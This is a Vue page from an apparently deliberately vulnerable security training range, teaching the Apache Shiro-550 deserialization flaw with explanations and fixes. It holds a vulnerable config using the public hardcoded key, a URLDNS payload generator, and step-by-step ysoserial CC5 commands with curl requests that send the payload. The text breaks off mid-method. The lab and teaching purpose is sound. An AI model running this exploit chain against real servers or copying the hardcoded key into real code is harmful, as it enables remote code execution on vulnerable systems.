<template>
    <div class="root-div">
        <div class="vuln-info">
            <div class="header-div">组件漏洞 -- Shiro-550反序列化漏洞</div>
            <div class="body-div">
                <el-tabs v-model="activeName" @tab-click="handleClick">
                    <el-tab-pane label="漏洞描述" name="first">
                        <div class="vuln-detail">
                            Shiro-550漏洞（CVE-2016-4437）是Apache Shiro框架中的一个严重反序列化漏洞，影响Shiro 1.2.4及以前版本。<br/>
                            <br/>
                            漏洞原理：<br/>
                            1. Shiro框架使用硬编码的AES密钥"kPH+bIxk5D2deZiIxcaaaA=="对rememberMe Cookie进行加密<br/>
                            2. 攻击者可以构造恶意的序列化数据，利用Commons Collections等gadget链进行攻击<br/>
                            3. 通过URLDNS、CommonsCollections1/2等链实现DNS探测或远程代码执行<br/>
                            4. 当Shiro处理rememberMe Cookie时，会解密并反序列化数据，触发漏洞<br/>
                            <br/>
                            常见原因：<br/>
                            1. 使用Shiro 1.2.4及以前版本<br/>
                            2. 未修改默认的硬编码密钥<br/>
                            3. 启用了rememberMe功能但未进行安全配置<br/>
                            4. 未对反序列化过程进行安全控制<br/>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="漏洞危害" name="second">
                        <div class="vuln-detail">
                            1. 远程代码执行（RCE）：攻击者可以在目标系统上执行任意命令<br/>
                            2. DNS探测：可以通过URLDNS链进行DNS查询，确认漏洞存在<br/>
                            3. 文件系统操作：可以读取、写入、删除系统文件<br/>
                            4. 网络连接：可以建立网络连接，进行数据外泄<br/>
                            5. 系统信息泄露：可以获取系统配置、环境变量等敏感信息<br/>
                            6. 权限提升：可能获取更高权限，完全控制目标系统<br/>
                            7. 横向移动：在内部网络中进一步扩散攻击<br/>
                            8. 会话劫持：可能获取用户会话信息，进行身份伪造<br/>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="安全编码" name="third">
                        <div class="vuln-detail">
                            【必须】升级Shiro版本到1.2.5或更高版本<br/>
                            新版本修复了硬编码密钥问题，使用随机生成的密钥。<br/>
                            <br/>
                            【必须】使用自定义的强随机密钥<br/>
                            在生产环境中必须替换默认密钥，使用32字节的强随机密钥。<br/>
                            <br/>
                            【必须】配置安全的Cookie属性<br/>
                            设置httpOnly=true、secure=true等安全属性，防止XSS和中间人攻击。<br/>
                            <br/>
                            【建议】考虑禁用rememberMe功能<br/>
                            如果业务不需要记住登录状态，建议完全禁用此功能。<br/>
                            <br/>
                            【建议】实施WAF防护措施<br/>
                            使用Web应用防火墙检测和阻止恶意payload。<br/>
                            <br/>
                            【建议】定期安全审计<br/>
                            定期进行代码安全审计，检查反序列化相关的安全配置。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="参考文章" name="fourth">
                        <div class="vuln-detail">
                            <b>相关技术文档和参考资源：</b>
                            <br/><br/>
                            <b>官方文档：</b>
                            <ul>
                                <li><a href="https://shiro.apache.org/" target="_blank" style="text-decoration: underline;">Apache Shiro官方文档</a></li>
                                <li><a href="https://shiro.apache.org/security-reports.html" target="_blank" style="text-decoration: underline;">Shiro安全报告</a></li>
                            </ul>
                            <br/>
                            <b>漏洞分析文章：</b>
                            <ul>
                                <li><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" style="text-decoration: underline;">SHIRO-550官方漏洞报告</a></li>
                                <li><a href="https://blog.csdn.net/qq_45521281/article/details/106647490" target="_blank" style="text-decoration: underline;">Shiro-550漏洞复现分析</a></li>
                                <li><a href="https://github.com/apache/shiro/commit/4d5bb8a2796f2492c7d01c50e2e664d7155f0b6b" target="_blank" style="text-decoration: underline;">Shiro-550修复提交</a></li>
                            </ul>
                            <br/>
                            <b>工具和检测：</b>
                            <ul>
                                <li><a href="https://github.com/frohoff/ysoserial" target="_blank" style="text-decoration: underline;">ysoserial - 反序列化漏洞利用工具</a></li>
                                <li><a href="https://github.com/wh1t3p1g/ysoserial" target="_blank" style="text-decoration: underline;">ysoserial增强版</a></li>
                                <li><a href="https://github.com/OWASP/CheatSheetSeries" target="_blank" style="text-decoration: underline;">OWASP安全配置检查清单</a></li>
                            </ul>
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </div>
        <div class="code-demo">
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">Shiro基本功能使用<div>
                                <el-button type="primary" round size="mini"
                                    @click="fetchDataAndFillTable3">去体验</el-button>
                            </div></el-row>
                        <pre v-highlightjs><code class="java">// Shiro基本功能演示
// 体验Shiro的认证和授权功能

// 1. 认证功能
@PostMapping("/login")
public Result shiroLogin(@RequestParam String username, 
                        @RequestParam String password,
                        @RequestParam(defaultValue = "false") boolean rememberMe) {
    try {
        // 使用Shiro进行认证
        Subject subject = SecurityUtils.getSubject();
        UsernamePasswordToken token = new UsernamePasswordToken(username, password, rememberMe);
        subject.login(token);
        
        // 获取用户信息
        Map&lt;String, Object&gt; userInfo = new HashMap&lt;&gt;();
        userInfo.put("username", username);
        userInfo.put("isAuthenticated", subject.isAuthenticated());
        userInfo.put("roles", subject.hasRole("admin") ? 
            Arrays.asList("admin", "user") : Arrays.asList("user"));
        
        return Result.success(userInfo);
    } catch (Exception e) {
        return Result.error("登录失败: " + e.getMessage());
    }
}

// 2. 授权功能 - 权限检查
@GetMapping("/test/permission/{permission}")
public Result testPermission(@PathVariable String permission) {
    try {
        Subject subject = SecurityUtils.getSubject();
        if (subject.isPermitted(permission)) {
            return Result.success("用户具有 " + permission + " 权限");
        } else {
            return Result.error("用户不具有 " + permission + " 权限");
        }
    } catch (Exception e) {
        return Result.error("权限检查失败: " + e.getMessage());
    }
}

// 3. 授权功能 - 角色检查
@GetMapping("/test/role/{role}")
public Result testRole(@PathVariable String role) {
    try {
        Subject subject = SecurityUtils.getSubject();
        if (subject.hasRole(role)) {
            return Result.success("用户具有 " + role + " 角色");
        } else {
            return Result.error("用户不具有 " + role + " 角色");
        }
    } catch (Exception e) {
        return Result.error("角色检查失败: " + e.getMessage());
    }
}
</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 升级Shiro版本<div>
                            </div></el-row>
                        <pre v-highlightjs><code class="xml">&lt;!-- 升级到最新版本的Shiro依赖 --&gt;

&lt;dependency&gt;
    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
    &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;
    &lt;version&gt;1.13.0&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
    &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;
    &lt;version&gt;1.13.0&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
    &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;
    &lt;version&gt;1.13.0&lt;/version&gt;
&lt;/dependency&gt;

&lt;!-- 
1. 升级Shiro版本到1.2.5或更高版本（推荐1.13.0）
2. 新版本修复了硬编码密钥问题，使用随机生成的密钥
3. 增强了反序列化安全控制
4. 改进了Cookie安全配置
5. 添加了更多的安全防护措施
--&gt;
</code></pre>
                    </div>
                </el-col>
            </el-row>
            <el-row :gutter="20" class="grid-flex">
              <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">漏洞代码 - Shiro-550反序列化漏洞<div>
                                <el-button type="danger" round size="mini"
                                    @click="fetchDataAndFillTable1">去测试</el-button>
                            </div></el-row>
                        <pre v-highlightjs><code class="java">// Shiro-550漏洞配置
@Bean
public CookieRememberMeManager rememberMeManager() {
    CookieRememberMeManager rememberMeManager = new CookieRememberMeManager();
    
    // 设置RememberMe Cookie
    SimpleCookie rememberMeCookie = new SimpleCookie("rememberMe");
    rememberMeCookie.setHttpOnly(false); // 允许JavaScript访问，便于测试
    rememberMeCookie.setMaxAge(2592000); // 30天
    rememberMeCookie.setPath("/");
    rememberMeManager.setCookie(rememberMeCookie);
    
    // 注意：这里使用的是Shiro 1.2.4版本的硬编码密钥
    // 在生产环境中应该使用自定义密钥
    byte[] key = org.apache.shiro.codec.Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
    rememberMeManager.setCipherKey(key);
    
    return rememberMeManager;
}

// Payload生成工具类
public static String generateURLDNSPayload(String dnsUrl) throws Exception {
    
    // **反射**
    // 创建HashMap
    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
    // 创建URL对象
    java.net.URL url = new java.net.URL(dnsUrl);
    // 反射将url对象的hashCode属性设置为非-1，避免序列化时发起DNS请求
    Field hashCodeField = java.net.URL.class.getDeclaredField("hashCode");
    hashCodeField.setAccessible(true);
    hashCodeField.set(url, 1234);  // 先设置为非-1，避免序列化时触发DNS
    // 将URL放入HashMap
    map.put(url, "dns");
    // 反射将url对象的hashCode属性改为-1，这样"反序列化"的时候才会执行hashCode方法
    hashCodeField.set(url, -1);  // 再设置为-1，让反序列化时触发DNS
    
    // **序列化**
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);
    oos.writeObject(map);
    oos.close();
    
    byte[] serialized = baos.toByteArray();
    
    // **生成rememberme（AES加密）**
    AesCipherService aes = new AesCipherService();
    ByteSource encrypted = aes.encrypt(serialized, DEFAULT_CIPHER_KEY_BYTES);
    
    return Base64.encodeToString(encrypted.getBytes());
}

// Shiro登录接口（Shiro-550漏洞测试目标）
@PostMapping("/login")
public Result shiroLogin(@RequestParam String username, 
                       @RequestParam String password,
                       @RequestParam(defaultValue = "false") boolean rememberMe) {
    try {
        // 使用Shiro进行认证
        org.apache.shiro.subject.Subject subject = org.apache.shiro.SecurityUtils.getSubject();
        org.apache.shiro.authc.UsernamePasswordToken token = 
            new org.apache.shiro.authc.UsernamePasswordToken(username, password, rememberMe);
        subject.login(token);
        
        // 获取用户信息
        Map&lt;String, Object&gt; userInfo = new HashMap&lt;&gt;();
        userInfo.put("username", username);
        userInfo.put("isAuthenticated", subject.isAuthenticated());
        userInfo.put("roles", subject.hasRole("admin") ? 
            java.util.Arrays.asList("admin", "user") : java.util.Arrays.asList("user"));
        
        return Result.success(userInfo);
    } catch (Exception e) {
        log.error("Shiro登录失败", e);
        return Result.error("Shiro登录失败: " + e.getMessage());
    }
}
</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 使用自定义密钥</el-row>
                        <pre v-highlightjs><code class="java">
//1、使用自定义强随机密钥

@Bean
public CookieRememberMeManager rememberMeManager() {
    CookieRememberMeManager rememberMeManager = new CookieRememberMeManager();
    
    // 设置RememberMe Cookie
    SimpleCookie rememberMeCookie = new SimpleCookie("rememberMe");
    rememberMeCookie.setHttpOnly(false); // 允许JavaScript访问，便于测试
    rememberMeCookie.setMaxAge(2592000); // 30天
    rememberMeCookie.setPath("/");
    rememberMeManager.setCookie(rememberMeCookie);
    
    // 方案1：使用硬编码密钥（漏洞版本）
    // byte[] key = org.apache.shiro.codec.Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
    
    // 方案2：使用自定义强随机密钥（修复版本）
    byte[] key = generateSecureKey();
    
    rememberMeManager.setCipherKey(key);
    
    return rememberMeManager;
}

/**
 * 生成安全的随机密钥
 * 这是修复Shiro-550漏洞的关键步骤
 */
private byte[] generateSecureKey() {
    try {
        // 生成32字节的强随机密钥
        java.security.SecureRandom random = new java.security.SecureRandom();
        byte[] key = new byte[32];
        random.nextBytes(key);
        
        // 记录生成的密钥（仅用于测试，生产环境不应记录）
        String keyBase64 = org.apache.shiro.codec.Base64.encodeToString(key);
        System.out.println("生成的随机密钥: " + keyBase64);
        
        return key;
    } catch (Exception e) {
        // 如果生成失败，使用一个固定的自定义密钥（仅用于演示）
        System.out.println("使用备用自定义密钥");
        return org.apache.shiro.codec.Base64.decode("MyCustomSecureKeyForShiro550Fix==");
    }
}

//2、使用固定的自定义密钥（仅用于测试）
byte[] key = org.apache.shiro.codec.Base64.decode("MyCustomSecureKeyForShiro550Fix==");
</code></pre>
                    </div>
                </el-col>
            </el-row>
            <el-row :gutter="20" class="grid-flex">
              <el-col :span="12">
              </el-col>
              <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 禁用rememberMe</el-row>
                        <pre v-highlightjs><code class="java">
package icu.secnotes.config;

import org.apache.shiro.spring.web.ShiroFilterFactoryBean;
import org.apache.shiro.web.mgt.DefaultWebSecurityManager;
// 删除RememberMe相关的import
// import org.apache.shiro.web.mgt.CookieRememberMeManager;
// import org.apache.shiro.web.servlet.SimpleCookie;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Shiro配置类
 * 配置Shiro 1.2.4框架，实现真实的Shiro-550漏洞
 */
@Configuration
public class ShiroConfig {

    /**
     * 创建ShiroFilterFactoryBean
     */
    @Bean
    public ShiroFilterFactoryBean shiroFilterFactoryBean(DefaultWebSecurityManager securityManager) {
        ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean();
        
        // 设置安全管理器
        shiroFilterFactoryBean.setSecurityManager(securityManager);
        
        // 设置登录页面 - 使用Shiro专用的登录页面
        shiroFilterFactoryBean.setLoginUrl("/components/shiro/login");
        // 设置登录成功页面 - 重定向到前端页面
        shiroFilterFactoryBean.setSuccessUrl("/");
        // 设置未授权页面
        shiroFilterFactoryBean.setUnauthorizedUrl("/components/shiro/unauthorized");
        
        // 配置过滤器链 - 只控制Shiro相关路径，不影响原有靶场接口
        Map&gt;String, String&lt; filterChainDefinitionMap = new LinkedHashMap&gt;&lt;();
        
        // 允许匿名访问的接口
        filterChainDefinitionMap.put("/components/shiro/login", "anon"); // 登录接口（Shiro-550漏洞测试目标）
        filterChainDefinitionMap.put("/components/shiro/unauthorized", "anon"); // 未授权页面
        filterChainDefinitionMap.put("/components/shiro/generate/**", "anon"); // payload生成接口
        
        // 需要登录认证的接口
        filterChainDefinitionMap.put("/components/shiro/logout", "authc"); // 登出接口（需要登录）
        filterChainDefinitionMap.put("/components/shiro/test/permission/**", "authc"); // 权限测试接口（需要登录）
        filterChainDefinitionMap.put("/components/shiro/test/role/**", "authc"); // 角色测试接口（需要登录）
        
        // 其他所有路径不经过Shiro过滤器，保持原有的Interceptor控制
        // filterChainDefinitionMap.put("/**", "anon");
        
        shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);
        return shiroFilterFactoryBean;
    }

    /**
     * 创建安全管理器
     */
    @Bean
    public DefaultWebSecurityManager securityManager() {
        DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();
        securityManager.setRealm(customShiroRealm());
        
        // 完全禁用RememberMe功能
        // 不设置RememberMe管理器，彻底禁用此功能
        
        return securityManager;
    }

    /**
     * 创建自定义Realm
     */
    @Bean
    public CustomShiroRealm customShiroRealm() {
        return new CustomShiroRealm();
    }

    // 完全删除RememberMe管理器方法
    // 不再创建CookieRememberMeManager Bean
}
</code></pre>
                    </div>
              </el-col>
            </el-row>
        </div>

        <!-- 打开嵌套表格的对话框1 -->
        <el-dialog title="Shiro-550反序列化测试" :visible.sync="dialogFormVisible1" class="center-dialog">
            <div style="text-align: left; color: red; font-style: italic;">
                注意：Shiro-550漏洞测试需要发送包含恶意payload的rememberMe Cookie<br>
                1、选择Payload类型并生成对应的rememberMe值<br>
                2、将生成的payload作为rememberMe Cookie发送到登录接口<br>
                3、观察服务器响应和日志，确认漏洞是否触发
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="Payload类型">
                    <el-select v-model="payloadForm.type" placeholder="请选择Payload类型" style="width: 100%">
                        <el-option label="CC5链 - 命令执行" value="cc5"></el-option>
                        <el-option label="URLDNS链 - DNS探测" value="urldns"></el-option>
                    </el-select>
                </el-form-item>
                
                <el-form-item label="命令/URL" v-if="payloadForm.type === 'cc5'">
                    <el-input v-model="payloadForm.command" placeholder="请输入要执行的命令，如：open -a Calculator"></el-input>
                </el-form-item>

                <el-form-item label="DNS URL" v-if="payloadForm.type === 'urldns'">
                    <el-input v-model="payloadForm.dnsUrl" placeholder="请输入DNSLog URL，如：http://xxx.dnslog.cn"></el-input>
                </el-form-item>
                
                <el-form-item v-if="payloadForm.type === 'urldns'">
                    <el-button type="primary" @click="generatePayload" :loading="generating">生成Payload</el-button>
                    <el-button type="danger" @click="clearPayload">清空</el-button>
                    <el-button type="success" @click="copyPayload">复制Payload</el-button>
                </el-form-item>
                
                <el-form-item label="生成的Payload" v-if="generatedPayload && payloadForm.type === 'urldns'">
                    <el-input
                        type="textarea"
                        v-model="generatedPayload"
                        :rows="4"
                        placeholder="生成的Payload将显示在这里"
                        readonly>
                    </el-input>
                </el-form-item>
            </el-form>
            
            <!-- CC5链攻击步骤展示 -->
            <div v-if="payloadForm.type === 'cc5'" style="margin-top: 20px; padding: 15px; background-color: #f8f9fa; border-radius: 4px; text-align: left;">
                <h4 style="margin-top: 0; color: #333;">CC5链攻击步骤：</h4>
                
                <div style="margin-bottom: 20px;">
                    <h5 style="color: #409EFF; margin-bottom: 10px;">步骤一：使用ysoserial生成CC5链payload</h5>
                    <div style="background-color: #2d3748; color: #e2e8f0; padding: 15px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12px; overflow-x: auto;">
                        <div style="margin-bottom: 5px;">java -jar ysoserial-all.jar CommonsCollections5 "{{payloadForm.command}}" > cc5_payload.ser</div>
                    </div>
                </div>
                
                <div style="margin-bottom: 20px;">
                    <h5 style="color: #409EFF; margin-bottom: 10px;">步骤二：使用Shiro-550工具加密payload</h5>
                    <div style="background-color: #2d3748; color: #e2e8f0; padding: 15px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12px; overflow-x: auto;">
                        <div style="margin-bottom: 5px;">1）java -jar ysoserial-all.jar CommonsCollections5 "touch /tmp/cc5_flag" > cc5_payload_52.ser</div>
                        <div style="margin-bottom: 5px;">2）使用Shiro-550工具加密payload，生成rememberMe值</div>
                        <pre v-highlightjs><code class="java">public static void generateRememberMe() throws Exception {

//byte[] payload = Files.readAllBytes(FileSystems.getDefault().getPath("/Users/liujianping/SpringVulnBoot/SpringVulnBoot-backend/src/test/java/icu/secnotes/test/URLDNS.ser"));
byte[] payload = Files.readAllBytes(FileSystems.getDefault().getPath("/Users/liujianping/SpringVulnBoot/SpringVulnBoot-backend/src/test/java/icu/secnotes/test/cc5_payload_52.ser"));

AesCipherService aes = new AesCipherService();
byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

ByteSource cipherText = aes.encrypt(payload, key);
System.out.println(cipherText);

}</code></pre>
                    </div>
                </div>
                
                <div style="margin-bottom: 20px;">
                    <h5 style="color: #409EFF; margin-bottom: 10px;">步骤三：使用curl发送攻击请求</h5>
                    <div style="background-color: #2d3748; color: #e2e8f0; padding: 15px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12px; overflow-x: auto;">
                        <div style="margin-bottom: 5px;">curl --location 'http://127.0.0.1:8080/components/shiro/login' \</div>
                        <div style="margin-bottom: 5px;">&nbsp;&nbsp;--header 'Authorization: {{getAuthorizationToken()}}' \</div>
                        <div style="margin-bottom: 5px;">&nbsp;&nbsp;--cookie 'rememberMe=生成的加密payload'</div>
                    </div>
                </div>
                
                <div>
                    <h5 style="color: #409EFF; margin-bottom: 10px;">工具下载链接：</h5>
                    <ul style="color: #666; margin-top: 10px; font-size: 12px;">
                        <li><strong>ysoserial:</strong> <a href="https://github.com/frohoff/ysoserial" target="_blank" style="color: #409EFF;">https://github.com/frohoff/ysoserial</a></li>
                        <li><strong>Shiro-550工具:</strong> <a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" style="color: #409EFF;">https://github.com/feihong-cs/ShiroExploit</a></li>
                    </ul>
                </div>
            </div>
            
            <!-- 测试方案展示 -->
            <div v-if="generatedPayload && payloadForm.type === 'urldns'" style="margin-top: 20px; padding: 15px; background-color: #f8f9fa; border-radius: 4px; text-align: left;">
                <h4 style="margin-top: 0; color: #333;">测试方案：</h4>
                
                <div style="margin-bottom: 20px;">
                    <h5 style="color: #409EFF; margin-bottom: 10px;">方案一：通过Burp Suite抓包修改请求包header头的cookie</h5>
                </div>
                
                <div>
                    <h5 style="color: #409EFF; margin-bottom: 10px;">方案二：直接使用以下curl命令发送攻击请求</h5>
                    <div style="background-color: #2d3748; color: #e2e8f0; padding: 15px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12px; overflow-x: auto;">
                        <div style="margin-bottom: 5px;">curl --location 'http://127.0.0.1:8080/components/shiro/login' \</div>
                        <div style="margin-bottom: 5px;">&nbsp;&nbsp;--header 'Authorization: {{getAuthorizationToken()}}' \</div>
                        <div style="margin-bottom: 5px;">&nbsp;&nbsp;--cookie 'rememberMe={{generatedPayload}}'</div>
                    </div>
                    <p style="color: #666; margin-top: 10px; font-size: 12px;">
                        <strong>说明：</strong>Authorization头中的JWT值会自动从localStorage中获取当前登录用户的token
                    </p>
                </div>
            </div>
            
            <div>
                <template>
                    <div v-html="resp_text1"></div>
                </template>
            </div>
        </el-dialog>

        <!-- 打开嵌套表格的对话框2 -->
        <el-dialog title="Shiro安全配置测试" :visible.sync="dialogFormVisible2" class="center-dialog">
            <div style="text-align: left; color: green; font-style: italic;">
                安全配置测试：使用自定义密钥的Shiro配置<br>
                1、此配置使用强随机密钥，无法被攻击者预测<br>
                2、设置了安全的Cookie属性，防止XSS和中间人攻击<br>
                3、即使发送恶意payload，也无法成功解密和反序列化
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="测试说明">
                    <el-input
                        type="textarea"
                        value="安全配置已启用，使用自定义密钥和安全的Cookie设置。即使攻击者构造恶意payload，也无法成功利用漏洞。"
                        :rows="4"
                        readonly>
                    </el-input>
                </el-form-item>
                <el-form-item>
                    <el-button type="success" @click="testSecureConfig">测试安全配置</el-button>
                </el-form-item>
            </el-form>
            <div>
                <template>
                    <div v-html="resp_text2"></div>
                </template>
            </div>
        </el-dialog>

        <!-- Shiro基本功能使用对话框 -->
        <el-dialog title="Shiro基本功能使用" :visible.sync="dialogFormVisible3" class="center-dialog" width="60%">
            <div v-if="!shiroUserInfo.isAuthenticated">
                <div style="text-align: center; margin-bottom: 40px;">
                    <p><strong>管理员:</strong> admin / admin (拥有所有权限)</p>
                    <p><strong>普通用户:</strong> user / user (拥有用户权限)</p>
                </div>
                <el-form class="demo-form-inline" :inline="true">
                    <el-form-item label="用户名">
                        <el-input v-model="shiroLoginForm.username" placeholder="请输入用户名"></el-input>
                    </el-form-item>
                    
                    <el-form-item label="密码">
                        <el-input v-model="shiroLoginForm.password" type="password" placeholder="请输入密码"></el-input>
                    </el-form-item>
                    
                    <el-form-item>
                        <el-checkbox v-model="shiroLoginForm.rememberMe">记住我</el-checkbox>
                    </el-form-item>
                    
                    <el-form-item>
                        <el-button type="primary" @click="shiroLogin" :loading="shiroLogging">登录</el-button>
                        <el-button @click="clearShiroLogin">清空</el-button>
                    </el-form-item>
                </el-form>
            </div>
            
            <div v-else>
                <!-- 用户信息展示 -->
                <div style="background: white; padding: 10px;  box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px;">
                    <div style="display: flex; justify-content: center; align-items: center; gap: 15px;">
                        <h3 style="margin: 0;">欢迎, {{ shiroUserInfo.username }}</h3>
                        <p style="margin: 0;"><strong>用户角色:</strong> {{ shiroUserInfo.roles.join(', ') }}</p>
                        <el-button type="danger" @click="shiroLogout" size="small">登出</el-button>
                    </div>
                </div>
                
                <!-- 功能菜单 -->
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                    <div style="background: white; padding: 25px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                        <h4>用户管理</h4>
                        <p style="color: #666; margin-bottom: 20px;">用户相关的操作功能，需要不同的权限级别。</p>
                        <div style="display: flex; flex-direction: column; gap: 10px;">
                            <el-button type="primary" @click="testUserPermission('user:view')" size="small">
                                用户列表 (需要 user:view 权限)
                            </el-button>
                            <el-button type="primary" @click="testUserPermission('user:edit')" size="small">
                                编辑用户 (需要 user:edit 权限)
                            </el-button>
                            <el-button type="primary" @click="testUserPermission('user:delete')" size="small">
                                删除用户 (需要 user:delete 权限)
                            </el-button>
                        </div>
                    </div>
                    
                    <div style="background: white; padding: 25px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                        <h4>管理员功能</h4>
                        <p style="color: #666; margin-bottom: 20px;">管理员专用的功能，需要 admin 角色。</p>
                        <div style="display: flex; flex-direction: column; gap: 10px;">
                            <el-button type="success" @click="testAdminPermission('admin')" size="small">
                                管理员首页 (需要 admin 角色)
                            </el-button>
                            <el-button type="success" @click="testAdminPermission('admin')" size="small">
                                系统设置 (需要 admin 角色)
                            </el-button>
                            <el-button type="success" @click="testAdminPermission('admin')" size="small">
                                用户管理 (需要 admin 角色)
                            </el-button>
                        </div>
                    </div>
                </div>
                
                <!-- 权限测试结果 -->
                <div v-if="permissionTestResult" style="margin-top: 20px; padding: 15px; background-color: #f8f9fa; border-radius: 4px;">
                    <h4>权限测试结果:</h4>
                    <div v-html="permissionTestResult"></div>
                </div>
            </div>
        </el-dialog>
    </div>
</template>

<script>
import { 
    generateURLDNSPayload
} from '@/api/shiro'

export default {
    name: 'ShiroVuln',
    data() {
        return {
            activeName: 'first',
            dialogFormVisible1: false,
            dialogFormVisible2: false,
            dialogFormVisible3: false, // 新增：Shiro基本功能使用对话框
            resp_text1: '',
            resp_text2: '',
            payloadForm: {
                type: 'cc5',
                command: 'open -a Calculator',
                dnsUrl: 'http://xxx.dnslog.cn'
            },
            generatedPayload: '',
            generating: false,
            testing: false,
            shiroUserInfo: { // 新增：Shiro用户信息
                isAuthenticated: false,
                username: '',
                roles: []
            },
            shiroLoginForm: { // 新增：Shiro登录表单
                username: '',
                password: '',
                rememberMe: false
            },
            shiroLogging: false, // 新增：Shiro登录加载状态
            permissionTestResult: '' // 新增：权限测试结果
        }
    },
    methods: {
        handleClick(tab, event) {
            console.log(tab, event);
        },
        fetchDataAndFillTable1() {
            this.dialogFormVisible1 = true;
            this.resp_text1 = '';
        },
        fetchDataAndFillTable2() {
            this.dialogFormVisible2 = true;
            this.resp_text2 = '';
        },
fetchDataAndFillTable3() {
            this.dialogFormVisible3 = true;
            this.permissionTestResult = '';
        },
        async generatePayload() {
            this.generating = true;
            try {
                let response;
                // 现在只有URLDNS链
                response = await generateURLDNSPayload(this.payloadForm.dnsUrl);
                
                if (response.code === 0) {
                    this.generatedPayload = response.data;
                    this.$message.success('Payload生成成功');
                } else {
                    this.$message.error(response.msg || 'Payload生成失败');
                }
            } catch (error) {
                console.error('生成Payload失败:', error);
                this.$message.error('生成Payload失败: ' + error.message);
            } finally {
                this.generating = false;
            }
        },
        

        
        testSecureConfig() {
            this.resp_text2 = `
                <div style="color: green;">
                    <strong>安全配置测试结果：</strong><br>
                    安全配置已启用，使用自定义密钥和安全的Cookie设置。<br><br>
                    <strong>安全特性：</strong><br>
                    1. 使用强随机密钥，无法被攻击者预测<br>
                    2. Cookie设置httpOnly=true，防止XSS攻击<br>
                    3. Cookie设置secure=true，仅在HTTPS下传输<br>
                    4. 即使攻击者构造恶意payload，也无法成功解密<br><br>
                    <strong>建议：</strong><br>
                    在生产环境中，建议定期更换密钥，并考虑完全禁用rememberMe功能。
                </div>
            `;
        },
        
        copyPayload() {
            if (this.generatedPayload) {
                navigator.clipboard.writeText(this.generatedPayload).then(() => {
                    this.$message.success('Payload已复制到剪贴板');
                }).catch(() => {
                    this.$message.error('复制失败，请手动复制');
                });
            }
        },
        
        clearPayload() {
            this.generatedPayload = '';
            this.payloadForm.command = 'open -a Calculator';
            this.payloadForm.dnsUrl = 'http://xxx.dnslog.cn';
        },

        // 获取Authorization token
        getAuthorizationToken() {
            return localStorage.getItem('Authorization') || 'YOUR_JWT_TOKEN_HERE';
        },
        


        // 新增：Shiro登录方法
        async shiroLogin() {
            if (!this.shiroLoginForm.username || !this.shiroLoginForm.password) {
                this.$message.warning('请输入用户名和密码');
                return;
            }
            this.shiroLogging = true;
            try {
                const response = await this.$store.dispatch('shiro/login', this.shiroLoginForm);
                if (response.code === 0) {
                    this.shiroUserInfo = response.data;
                    this.$message.success('登录成功！');
                                        this.permissionTestResult = ''; // 清空权限测试结果
                } else {
                    this.$message.error(response.msg || '登录失败');
                }
            } catch (error) {
                console.error('Shiro登录失败:', error);
                this.$message.error('登录失败: ' + error.message);
            } finally {
                this.shiroLogging = false;
            }
        },

        // 新增：Shiro登出方法
        async shiroLogout() {
try {
                await this.$store.dispatch('shiro/logout');
this.shiroUserInfo = {
                    isAuthenticated: false,
                    username: '',
                    roles: []
                };
                this.$message.success('已登出');
            } catch (error) {
                console.error('Shiro登出失败:', error);
                // 即使登出失败，也清除本地状态
            this.shiroUserInfo = {
                isAuthenticated: false,
                username: '',
                roles: []
            };
            this.$message.success('已登出');
}
        },

        // 新增：权限测试方法
        async testUserPermission(permission) {
            this.permissionTestResult = '';
            try {
                const response = await this.$store.dispatch('shiro/testPermission', permission);
                if (response.code === 0) {
                    this.permissionTestResult = `
                        <div style="color: green;">
                            <strong>权限测试成功：</strong><br>
                            用户具有 ${permission} 权限。<br>
                            接口响应：${response.data}
                        </div>
                    `;
                } else {
                    this.permissionTestResult = `
                        <div style="color: red;">
                            <strong>权限测试失败：</strong><br>
                            用户不具有 ${permission} 权限。<br>
                            接口响应：${response.msg}
                        </div>
                    `;
                }
            } catch (error) {
